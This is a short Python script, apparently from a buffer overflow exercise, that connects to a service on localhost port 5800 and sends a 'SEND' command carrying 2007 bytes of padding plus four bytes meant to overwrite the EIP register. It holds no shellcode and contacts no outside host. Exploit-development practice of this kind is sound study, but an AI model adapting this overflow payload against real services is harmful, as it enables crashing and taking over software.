import socket

IP = "127.0.0.1"
PORT = 5800

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

padding = "A" * 2007
eip = "BBBB"
payload = padding + eip

s.connect((IP, PORT))
s.send(f"SEND {payload} \r\n".encode())
s.recv(1024)